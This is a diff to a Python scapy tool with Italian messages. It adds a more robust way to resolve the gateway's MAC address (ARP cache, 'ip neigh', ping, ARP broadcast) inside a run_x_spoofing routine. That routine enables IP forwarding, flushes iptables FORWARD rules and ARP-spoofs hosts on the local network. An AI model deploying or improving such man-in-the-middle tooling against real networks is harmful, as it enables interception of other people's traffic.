@@ -8,7 +8,7 @@ import sys
 import time
 from typing import Callable, List, Tuple
 
-from scapy.all import ARP, Ether, conf, get_if_hwaddr, getmacbyip, sendp
+from scapy.all import ARP, Ether, conf, get_if_hwaddr, sendp, srp
 
 StatusCallback = Callable[[str], None]
 
@@ -40,6 +40,66 @@ def get_my_ip(interface: str) -> str:
 def get_network(ip: str, prefix: int = 24) -> str:
     parts = ip.split(".")
     return ".".join(parts[:3]) + ".0/" + str(prefix)
+
+
+def _mac_from_arp_table(ip: str) -> str | None:
+    try:
+        with open("/proc/net/arp") as f:
+            lines = f.readlines()[1:]
+    except OSError:
+        return None
+    for line in lines:
+        fields = line.split()
+        if len(fields) < 4:
+            continue
+        if fields[0] == ip and fields[3] not in ("00:00:00:00:00:00", "<incomplete>"):
+            return fields[3]
+    return None
+
+
+def _mac_from_ip_neigh(ip: str, interface: str) -> str | None:
+    try:
+        out = subprocess.check_output(
+            ["ip", "neigh", "show", ip, "dev", interface],
+            stderr=subprocess.DEVNULL,
+        ).decode()
+    except (FileNotFoundError, subprocess.CalledProcessError):
+        return None
+    for token in out.split():
+        if token.count(":") == 5 and token != "00:00:00:00:00:00":
+            return token.lower()
+    return None
+
+
+def resolve_mac(ip: str, interface: str) -> str | None:
+    """MAC di un host sulla LAN: cache ARP, ping, poi richiesta ARP sull'interfaccia."""
+    mac = _mac_from_arp_table(ip) or _mac_from_ip_neigh(ip, interface)
+    if mac:
+        return mac
+
+    subprocess.call(
+        ["ping", "-c", "2", "-W", "1", "-I", interface, ip],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    mac = _mac_from_arp_table(ip) or _mac_from_ip_neigh(ip, interface)
+    if mac:
+        return mac
+
+    conf.iface = interface
+    try:
+        answered, _ = srp(
+            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
+            iface=interface,
+            timeout=3,
+            retry=2,
+            verbose=False,
+        )
+    except Exception:
+        return None
+    if not answered:
+        return None
+    return answered[0][1].hwsrc
 
 
 def arp_spoof(
@@ -145,9 +205,13 @@ def run_x_spoofing(
 
     _log(f"[+] Target trovati: {len(targets)} su {network}", on_status)
 
-    gateway_mac = getmacbyip(gateway_ip)
+    gateway_mac = resolve_mac(gateway_ip, interface)
     if not gateway_mac:
-        raise RuntimeError("MAC del gateway non trovato.")
+        raise RuntimeError(
+            "MAC del gateway non trovato. "
+            "Controlla l'IP del router (opzione 3) e che sia sulla stessa interfaccia."
+        )
+    _log(f"[+] Gateway MAC: {gateway_mac}", on_status)
 
     enable_ip_forward(True)
     subprocess.call(["iptables", "-F", "FORWARD"])
